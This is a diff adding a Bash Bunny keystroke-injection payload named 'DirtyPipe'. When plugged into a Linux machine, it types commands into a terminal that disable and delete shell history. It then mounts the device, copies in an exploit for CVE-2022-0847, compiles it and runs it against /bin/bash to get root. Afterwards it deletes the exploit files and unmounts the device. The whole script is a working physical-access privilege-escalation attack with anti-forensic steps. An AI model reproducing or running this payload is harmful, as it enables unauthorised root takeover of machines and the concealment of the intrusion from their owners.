@@ -1,0 +1,82 @@
+# Title: DirtyPipe
+# Description: Exploit for a new Linux vulnerability known as 'Dirty Pipe(CVE-2022-0847)' allows local users to gain root privileges.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Execution
+# Target: Linux operating systems.
+# Attackmodes: HID, Storage
+
+LED SETUP
+ATTACKMODE STORAGE HID
+GET SWITCH_POSITION
+LED ATTACK
+Q DELAY 1000
+Q CTRL-ALT t
+Q DELAY 1000
+
+# [Prevent storing history]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 100
+Q STRING HISTSIZE=0
+Q ENTER
+Q DELAY 100
+Q STRING rm -f '$HISTFILE'
+Q ENTER
+Q DELAY 100
+
+# [Fetching BashBunny's block device]
+Q STRING lol='$(lsblk | grep 1.8G)'
+Q ENTER
+Q DELAY 100
+Q STRING disk='$(echo $lol | awk '\'{print\ '$1'}\'\)''
+Q ENTER
+Q DELAY 200
+
+# [Mounting BashBunny]
+Q STRING udisksctl mount -b /dev/'$disk' /tmp/tmppp
+Q ENTER
+Q DELAY 2000
+Q STRING mntt='$(lsblk | grep $disk | awk '\'{print\ '$7'}\'\)''
+Q ENTER
+Q DELAY 500
+
+# [transfering and executing exploit]
+Q STRING cp -r '$mntt'/payloads/library/dirtypipe.c /tmp/
+Q ENTER
+Q DELAY 100
+Q STRING gcc /tmp/dirtypipe.c -o /tmp/dirtypipe
+Q ENTER
+Q DELAY 1000
+Q STRING chmod +x /tmp/dirtypipe
+Q ENTER
+Q STRING /tmp/./dirtypipe /bin/bash
+Q ENTER
+Q DELAY 500
+Q STRING sudo su
+Q ENTER
+Q CTRL-ALT t
+Q DELAY 500
+Q STRING rm /tmp/dirtypipe
+Q ENTER
+Q DELAY 100
+Q STRING rm /tmp/dirtypipe.c
+Q ENTER
+Q DELAY 200
+
+# [Unmounting BashBunny]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 100
+Q STRING lol='$(lsblk | grep 1.8G)'
+Q ENTER
+Q DELAY 100
+Q STRING disk='$(echo $lol | awk '\'{print\ '$1'}\'\)''
+Q ENTER
+Q DELAY 100
+Q STRING udisksctl unmount -b /dev/'$disk' 
+Q ENTER
+Q DELAY 500
+Q STRING exit
+Q ENTER 
+LED FINISH
